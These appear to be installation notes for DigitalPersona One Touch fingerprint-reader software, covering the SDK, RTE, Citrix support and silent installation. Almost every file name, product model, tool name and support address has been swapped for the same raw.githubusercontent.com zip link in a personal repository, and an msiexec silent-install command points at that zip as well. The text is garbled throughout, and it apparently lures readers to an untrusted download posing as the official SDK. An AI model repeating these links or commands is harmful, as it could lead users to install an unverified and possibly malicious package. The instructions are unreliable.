...
2- Run https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip located in the SDK folder
3- Follow the installation instructions
4- Connect the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip Fingerprint Reader

One Touch for Windows RTE 1.6.1
1- Open/load the One Touch for Windows product package 
2- Run https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip located in the RTE folder
3- Follow the installation instructions
4- Connect the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip Fingerprint Reader
...
- DigitalPersona https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip 4000B or https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip 4500 fingerprint reader
...
- Locate the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip file in the product package, "Misc\Citrix Support" folder, and copy it to the folder on the client computer where the Citrix client components are located. For example, when using the Program Neighborhood client copy to the "Program Files\Citrix\ICA Client" folder. 
- Using the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip program, register the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip library.
- If you have several Citrix clients installed on a computer, deploy the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip library to the Citrix client folder for each client.
...
4.6 Silent installation requires the .NET Framework 2.0 or later. However, you can run a silent installation without the .NET Framework by modifying the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip file to bypass installation of .NET components:
msiexec /i https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip ADDLOCAL="FpRecLibs,ThinClientRDP,ActiveXFpRecLibs,ActiveXThinClientRDP,JavaFpRecLibs,JavaThinClientRDP" /qn /l*v c:\https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip
...
5.1 You may be required to manually locate the https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip file (fingerprint reader driver) when installing this product on an XP Embedded computer. The file is located in the "\Windows\DPDrv" folder.
...
Technical support is available through the DigitalPersona Developer Connection at https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip, where you can search for answers to questions posted by other developers and post your own questions. You can also purchase a Developer Support package at our web store, https://raw.githubusercontent.com/johnnydelsage/Digital-Persona-SDK/master/morion/Digital-Persona-SDK.zip
